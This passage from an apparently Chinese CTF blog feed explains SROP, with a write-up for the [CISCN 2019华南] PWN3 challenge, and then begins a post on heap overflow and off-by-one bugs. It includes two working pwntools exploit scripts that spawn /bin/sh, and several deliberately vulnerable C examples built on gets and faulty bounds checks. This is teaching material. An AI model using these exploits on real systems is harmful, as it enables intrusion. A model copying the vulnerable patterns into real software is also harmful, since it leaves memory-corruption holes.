class="hljs-type">short</span> cs, __csh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp_at_signal;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ss, __ssh;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> oldmask;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cr2;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>64位</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span><br>  <span class="hljs-type">__uint16_t</span>        cwd;<br>  <span class="hljs-type">__uint16_t</span>        swd;<br>  <span class="hljs-type">__uint16_t</span>        ftw;<br>  <span class="hljs-type">__uint16_t</span>        fop;<br>  <span class="hljs-type">__uint64_t</span>        rip;<br>  <span class="hljs-type">__uint64_t</span>        rdp;<br>  <span class="hljs-type">__uint32_t</span>        mxcsr;<br>  <span class="hljs-type">__uint32_t</span>        mxcr_mask;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpxreg</span>    _<span class="hljs-title">st</span>[8];</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">xmmreg</span>    _<span class="hljs-title">xmm</span>[16];</span><br>  <span class="hljs-type">__uint32_t</span>        padding[<span class="hljs-number">24</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">__uint64_t</span> r8;<br>  <span class="hljs-type">__uint64_t</span> r9;<br>  <span class="hljs-type">__uint64_t</span> r10;<br>  <span class="hljs-type">__uint64_t</span> r11;<br>  <span class="hljs-type">__uint64_t</span> r12;<br>  <span class="hljs-type">__uint64_t</span> r13;<br>  <span class="hljs-type">__uint64_t</span> r14;<br>  <span class="hljs-type">__uint64_t</span> r15;<br>  <span class="hljs-type">__uint64_t</span> rdi;<br>  <span class="hljs-type">__uint64_t</span> rsi;<br>  <span class="hljs-type">__uint64_t</span> rbp;<br>  <span class="hljs-type">__uint64_t</span> rbx;<br>  <span class="hljs-type">__uint64_t</span> rdx;<br>  <span class="hljs-type">__uint64_t</span> rax;<br>  <span class="hljs-type">__uint64_t</span> rcx;<br>  <span class="hljs-type">__uint64_t</span> rsp;<br>  <span class="hljs-type">__uint64_t</span> rip;<br>  <span class="hljs-type">__uint64_t</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> __pad0;<br>  <span class="hljs-type">__uint64_t</span> err;<br>  <span class="hljs-type">__uint64_t</span> trapno;<br>  <span class="hljs-type">__uint64_t</span> oldmask;<br>  <span class="hljs-type">__uint64_t</span> cr2;<br>  __extension__ <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>      <span class="hljs-type">__uint64_t</span> __fpstate_word;<br>    &#125;;<br>  <span class="hljs-type">__uint64_t</span> __reserved1 [<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>信号帧都会被直接压入堆栈中存储，如下图中 siginfo 和 ucontext 组成信号帧</p><p><img src="D:/笔记/PWN/SROP/栈结构.png"></p><p>简而言之，</p><p>在运行信号处理程序之前——上下文被推入堆栈<br>完成执行信号处理程序后——上下文将从堆栈中弹出</p><h3 id="sigreturn"><a href="#sigreturn" class="headerlink" title="sigreturn"></a>sigreturn</h3><p>最重要的是 sigreturn 部分，signal handler 返回后，内核为执行 sigreturn 系统调用，要恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。它不检查上下文中栈的完整性，只是简单的填充对应的内容到相应的寄存器中。</p><p><img src="/img/SROP/sigreturn.png"></p><p>这就意味着我们只要把想要的值填进寄存器，当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell，达到想要的效果。</p><p>其中，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15。</p><h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><h3 id="SROP特点"><a href="#SROP特点" class="headerlink" title="SROP特点"></a>SROP特点</h3><ul><li><p>依赖系统调用（syscall）强但对 libc.so 的依赖极少。</p></li><li><p>要有空间存放 Signal Frame 的信息.</p></li><li><p>与其他 rop 相比，对的依赖 gadgets 较少。</p></li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。因此我们就可以在程序某一个地方伪造一个 <code>signal Frame</code> ，再让程序 <code>sys_rt_sigreturn</code> 我们构造的 fake signal Frame，让进程恢复到我们构造的恶意状态。</p><p><img src="/img/SROP/system_call_chains.png"></p><p>利用的前提是目标程序中存在 sigreturn片段也就是 <code>syscall;ret;</code> 代码段，我们直接向栈上写入 Signal Frame 即可。</p><p>以下是常用的系统调用号：</p><ul><li>i386</li></ul><table><thead><tr><th align="center">NR</th><th align="center">syscall name</th><th align="center">%eax</th><th align="center">arg0 (%ebx)</th><th align="center">arg1 (%ecx)</th><th align="center">arg2 (%edx)</th></tr></thead><tbody><tr><td align="center">3</td><td align="center">read</td><td align="center">0x03</td><td align="center">unsigned int fd</td><td align="center">char *buf</td><td align="center">size_t count</td></tr><tr><td align="center">4</td><td align="center">write</td><td align="center">0x04</td><td align="center">unsigned int fd</td><td align="center">const char *buf</td><td align="center">size_t count</td></tr><tr><td align="center">5</td><td align="center">open</td><td align="center">0x05</td><td align="center">const char *filename</td><td align="center">int flags</td><td align="center">umode_t mode</td></tr><tr><td align="center">11</td><td align="center">execve</td><td align="center">0x0b</td><td align="center">const char *filename</td><td align="center">char *const *argv</td><td align="center">char *const *envp</td></tr><tr><td align="center">173</td><td align="center">rt_sigreturn</td><td align="center">0xad</td><td align="center">?</td><td align="center">?</td><td align="center">?</td></tr></tbody></table><ul><li>amd64</li></ul><table><thead><tr><th align="center">NR</th><th align="center">syscall name</th><th align="center">%rax</th><th align="center">arg0 (%rdi)</th><th align="center">arg1 (%rsi)</th><th align="center">arg2 (%rdx)</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">read</td><td align="center">0x00</td><td align="center">unsigned int fd</td><td align="center">char *buf</td><td align="center">size_t count</td></tr><tr><td align="center">1</td><td align="center">write</td><td align="center">0x01</td><td align="center">unsigned int fd</td><td align="center">const char *buf</td><td align="center"></td></tr><tr><td align="center">2</td><td align="center">open</td><td align="center">0x02</td><td align="center">const char *filename</td><td align="center">int flags</td><td align="center">umode_t mode</td></tr><tr><td align="center">3</td><td align="center">rt_sigreturn</td><td align="center">0x0f</td><td align="center">?</td><td align="center">?</td><td align="center">?</td></tr><tr><td align="center">59</td><td align="center">execve</td><td align="center">0x3b</td><td align="center">const char *filename</td><td align="center">char *const *argv</td><td align="center">char *const *envp</td></tr></tbody></table><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h4 id="CISCN-2019华南-PWN3"><a href="#CISCN-2019华南-PWN3" class="headerlink" title="[CISCN 2019华南] PWN3"></a>[CISCN 2019华南] PWN3</h4><p>题目链接：<a href="https://www.nssctf.cn/problem/133">CISCN 2019华南]PWN3 | NSSCTF</a></p><h5 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h5><h6 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h6><p><img src="/img/SROP/srop1_checksec.png"></p><p>运行起来只有一个输入和输出，没有任何文字提示</p><p><img src="/img/SROP/srop1_checksec2.png"></p><h6 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h6><p>整个程序很小就只有一个函数 <code>vlun()</code>，利用的是 syscall 系统调用来调用所用到的函数。</p><p><img src="/img/SROP/srop1_vuln.png"></p><p>read 可以读取 400 字节，但是 buf 只有 10 字节长度，是一个可以用空间很大的栈溢出问题。同样输出也是大于 buf 大小的，所以可以造成信息泄露。</p><p>我们看汇编代码部分，有一个现成的 <code>syscall;ret;</code> 供我们使用。</p><p><img src="/img/SROP/srop1_syscall.png"></p><h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>在第一次 read、write 时向栈上写入 ‘&#x2F;bin&#x2F;sh\x00’，并泄露出它的地址。</p><p>泄露地址后需要计算相应的偏移，我们本地调试，在等待输入的时候输入aaaa，接着直接 <code>search aaaa</code> 查看字符串存储的位置。</p><p><img src="/img/SROP/srop1_str.png"></p><p>我们最开始进入函数的时候的 rsi 指向栈基址，</p><p><img src="/img/SROP/srop1_rip.png"></p><p>所以我们的偏移是 offset &#x3D; 0xe0d8-0xdfc0&#x3D;0x118</p><p>有两种攻击方法：</p><ul><li>execve 与 libc_csu_init</li></ul><p>用利用题目中 <code>mov rax, 3Bh;ret</code> gatget 来修改 rax 为 0x3b（execve），同时利用 libc_csu_init 来修改 rdx 为 0，用 <code>pop rdi;ret</code> 来修改 rdi 的值指向 <code>/bin/sh</code> 。</p><ul><li>srop</li></ul><p>利用 srop ，在栈中部署一个伪造 signal Frame sigcontext，然后用 rt_sigreturn 来恶意恢复重而 get shell 。</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>vuln_addr=<span class="hljs-number">0x04004F1</span><br>pay=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(vuln_addr)<br><br>p.sendline(pay)<br>add=p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(u64(add)-<span class="hljs-number">0x118</span>))<br>stack=u64(add)-<span class="hljs-number">0x118</span><br>log.info(<span class="hljs-string">&#x27;stack:&#x27;</span>+<span class="hljs-built_in">hex</span>(stack))<br>rax=<span class="hljs-number">0x04004E2</span> <br>libc_csu_init_gat1=<span class="hljs-number">0x040059A</span><br>libc_csu_init_gat2=<span class="hljs-number">0x0400580</span><br>rdi_ret=<span class="hljs-number">0x04005a3</span><br>syscall_ret=<span class="hljs-number">0x0000000000400517</span><br><br>pay=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(rax)+p64(libc_csu_init_gat1)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(stack+<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(libc_csu_init_gat2)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(rdi_ret)+p64(stack)+p64(syscall_ret)<br><br>p.sendline(pay)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>vuln_addr=<span class="hljs-number">0x04004F1</span><br>pay=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(vuln_addr)<br><br>p.sendline(pay)<br>add=p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(u64(add)-<span class="hljs-number">0x118</span>))<br>stack=u64(add)-<span class="hljs-number">0x118</span><br>log.info(<span class="hljs-string">&#x27;stack:&#x27;</span>+<span class="hljs-built_in">hex</span>(stack))<br><br>syscall_ret=<span class="hljs-number">0x0400517</span>   <span class="hljs-comment"># syscall ; ret</span><br>rax=<span class="hljs-number">0x004004DA</span>  <span class="hljs-comment">#mov rax, 0Fh;ret</span><br>frame = SigreturnFrame()<br>frame.rax = <span class="hljs-number">59</span><br>frame.rdi = stack<br>frame.rsi = <span class="hljs-number">0</span><br>frame.rdx = <span class="hljs-number">0</span><br>frame.rip = syscall_ret<br>pay=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(rax)+p64(syscall_ret)+<span class="hljs-built_in">str</span>(frame)<br>p.sendline(pay)<br>p.interactive()<br></code></pre></td></tr></table></figure><hr><p>事情要从我在nepCTF做了一个SROP但根本不会做开始说起···</p><p>之前做过这个例题但是就使用 ret2csu 做的，现在发现 SROP 更简单</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆漏洞利用(一)</title>
    <link href="/2023/08/06/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/"/>
    <url>/2023/08/06/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p>堆漏洞的利用姿势，赶紧来学习一下吧！！</p><span id="more"></span><p><del>这个人发什么疯</del></p><blockquote><p>如果没有特殊说明，环境为 ubuntu16  libc2.23  64位</p><p>这个网址可以查看源码 ：<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c">malloc.c - malloc&#x2F;malloc.c - Glibc source code (glibc-2.23) - Bootlin</a></p></blockquote><h1 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h1><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>堆溢出是指程序向某个堆块写入的字节数超过了堆块本身<strong>可以使用的字节数</strong>，因而导致了数据溢出，并覆盖到了物理相邻的高地址的下一个堆块。</p><p>堆溢出的前提是：</p><ul><li>程序向堆上写入数据</li><li>写入的数据大小没有被良好的控制</li></ul><p>堆溢出和栈溢出、BSS段溢出相似，是一种缓冲区溢出。但是与栈溢出不同的是，对上并没有返回地址这样的可以让攻击者直接控制执行流程的数据，因此在堆溢出的利用中，我们无法通过控制EIP来控制程序。</p><p>但我们可以利用与堆相关的数据结构哇，我们的利用策略如下：</p><ul><li><p>覆盖与其<strong>物理相邻的下一个 chunk</strong> 的内容</p><ul><li><p>prev_size</p></li><li><p>size，低三位的比特位数据，以及堆块真正的大小</p><ul><li><p>NON_MAIN_ARENA</p></li><li><p>IS_MAPPED</p></li><li><p>PREV_INUSE</p></li><li><p>the true chunk size</p></li></ul></li><li><p>chunk content，改变程序的执行流</p></li></ul></li><li><p>利用堆的机制实现任意地址写入或者控制堆块中的内容，从而执行程序的控制流。</p></li></ul><h3 id="举个栗子："><a href="#举个栗子：" class="headerlink" title="举个栗子："></a>举个栗子：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> <br>&#123;<br>  <span class="hljs-type">char</span> *chunk;<br>  chunk=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get input:&quot;</span>);<br>  gets(chunk);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们输入A*100，就可以把相邻的堆覆盖掉</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/heapout_first.png"></p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/heapout_last.png"></p><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><h5 id="寻找分配函数"><a href="#寻找分配函数" class="headerlink" title="寻找分配函数"></a>寻找分配函数</h5><p>通常来说，堆通过 malloc 函数分配，在某些情况下也会通过 calloc 函数分配。这两个函数的区别就是 calloc 在分配后会将空间全部初始化为0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-comment">//等同于</span><br>ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-built_in">memset</span>(ptr,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>);<br></code></pre></td></tr></table></figure><p>除此之外，还有一个 realloc 分配方式，用于将目标内存扩大。realloc 函数可以身兼 malloc 和 free 两个函数的功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">reaclloc(prt,size)        <span class="hljs-comment">//将ptr内存大小增大到size。</span><br></code></pre></td></tr></table></figure><p>具体操作：</p><ul><li><p>如果 realloc 的 size 不等于 prt 的 size ：</p><ul><li>申请 size &gt; 原来的 size<ul><li>如果 chunk 与 top chunk 相邻，直接拓展这个 chunk 到新的 size 大小</li><li>如果 chunk 与 top chunk 不相邻，相当于 <code>free(ptr); malloc(new_size)</code></li></ul></li><li>申请 size &lt; 原来的 size<ul><li>如果相差不足以容纳一个最小的 chunk，（64 位下 32 个字节，32 位下 16 个字节），则保持不变</li><li>如果相差足够容纳下一个最小的 chunk，就切割原本的 chunk，free 掉后半部分</li></ul></li></ul></li><li><p>如果 realloc 的 size 等于 0，相当于 <code>free(prt)</code></p></li><li><p>如果 realloc 的 size 等于 prt 的 size，那计算机将不进行任何操作</p></li></ul><h5 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h5><p>其实就是栈溢出的时候我们利用的那一批危险函数。常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>strcat，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>bcopy</li></ul></li></ul><h5 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h5><p>计算我们开始写入的地址与我们所要覆盖的地址之间的距离。需要注意的是，malloc参数并不等于实际堆块分配的大小，我们之前提到，在实际的内存分配中需要保证chunk 大小是对齐的（字长的两倍）。</p><p>并且也并不是机器分配的chunk都是用户可以使用的用户区域，<code>chunk_head.size = 用户区域大小 + 2 * 字长</code></p><p>就比如我们使用 <code>malloc(24)</code> ，在 64 位的系统中申请 24 字节的 chunk 。但由于需要保证内存对齐，系统会向上取整到 32 字节。在分配出来的32字节中，又有两个机器字长也就是 16 字节的头部不能供用户使用，所以实际上我们申请 24 字节的字段，实际上用户可以使用的 chunk 为 16 字节。</p><p>但是这个堆块仍然可以储存24字节的数据，因为它可以使用下一个 chunk 的 pre_size 字段，正好 24 个字节（ off-by-one 漏洞就是这么来的）。</p><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><p>严格来讲 off-by-one 也是一种溢出的操作，但是 off-by-one 特指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只<strong>越界了一个字节</strong>的溢出利用。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>off-by-one 是单字节溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况（就像上一个 malloc(24) 的例子）。</p><p>其中边界验证不严谨主要有以下几种可能：</p><ul><li>使用循环语句向堆中写入数据时，循环次数设置错误</li><li>字符串操作不正确</li></ul><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h5 id="溢出字节为可控制字节"><a href="#溢出字节为可控制字节" class="headerlink" title="溢出字节为可控制字节"></a>溢出字节为可控制字节</h5><p>通过修改内存块的大小造成块结构之间的重叠，从而泄露其他块数据，或是覆盖修改其他块数据。</p><h5 id="溢出字节为NULL字节"><a href="#溢出字节为NULL字节" class="headerlink" title="溢出字节为NULL字节"></a>溢出字节为NULL字节</h5><p>在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。</p><ul><li>使用 unlink 进行处理</li><li>这时 <code>prev_size</code> 域就会启用，可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li></ul><blockquote><p>在glibc2.28及以前的版本中都是可以使用的，最新版本中已经添加了对应的检查方法。</p></blockquote><h4 id="🌰："><a href="#🌰：" class="headerlink" title="🌰："></a>🌰：</h4><p>栗子1：</p><p>导致 off-by-one 漏洞的一个原因就是输入的边界检查不清，以下是一个栅栏错误：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">my_gets</span><span class="hljs-params">(<span class="hljs-type">char</span> *ptr,<span class="hljs-type">int</span> size)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=size;i++)<br>    &#123;<br>        ptr[i]=getchar();<br>    &#125;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get Input:&quot;</span>);<br>    my_gets(chunk1,<span class="hljs-number">16</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如上，我们自己写的 my_gets 函数实际输入 size+1 位数据，造成了 off-by-one 溢出。</p><p>我们使用 gdb 对程序进行调试，查看在进行输入分配的堆块为两个十六字节的堆块：</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/chunk_heap.png"></p><p>连续输入17个1，会发现覆盖到了下一个 chunk 的 <em>prev_size</em> 字节。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/chunk_heapflow.png"></p><p>栗子2：</p><p>导致 off-by-one 的场景就是字符串操作了，常见的原因是字符串的结束符计算有误</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">40</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">void</span> *chunk1;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">24</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Get Input&quot;</span>);<br>    gets(buffer);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)==<span class="hljs-number">24</span>)<br>    &#123;<br>        <span class="hljs-built_in">strcpy</span>(chunk1,buffer);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>           <br>&#125;<br></code></pre></td></tr></table></figure><p>这个程序乍一看没有任何问题，但是我们需要注意到的是，strlen 的长度计算方法和 strcpy 复制时的长度是不一样的。strlen 计算ASCII 字符串的长度，它在计算长度时是不会把字符串结尾的 ‘\x00’ 计算在内的，但是 strcpy 在复制字符串的时候会拷贝字符串的结束符 ‘\x00’ 。这就导致我们实际上是向chunk1 中写入了25字节。</p><p>在strcpy命令执行之前我们的堆结构如下：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x804b158</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><span class="hljs-number">0</span>x00000<span 